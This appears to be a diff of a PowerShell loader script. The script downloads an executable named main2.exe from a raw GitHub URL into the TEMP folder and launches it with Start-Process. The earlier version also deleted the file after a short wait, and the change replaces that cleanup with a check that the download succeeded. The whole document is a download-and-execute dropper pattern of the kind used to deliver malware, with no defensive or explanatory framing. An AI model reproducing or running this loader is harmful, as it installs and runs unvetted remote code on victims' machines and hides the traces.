@@ -2,16 +2,22 @@
 $exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"
 
 # ===== TEMP PATH =====
-$tempExe = Join-Path $env:TEMP "main2.exe"
+$tempExe = "$env:TEMP\main2.exe"
 
 # ===== DOWNLOAD =====
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
 
-# ===== RUN =====
-Start-Process $tempExe
+# ===== CHECK =====
+if (Test-Path $tempExe) {
 
-# ===== WAIT =====
-Start-Sleep -Seconds 3
+    Write-Host "Downloaded"
 
-# ===== DELETE TEMP FILE =====
-Remove-Item $tempExe -Force
+    # ===== RUN =====
+    Start-Process $tempExe
+
+}
+else {
+
+    Write-Host "Download failed"
+
+}
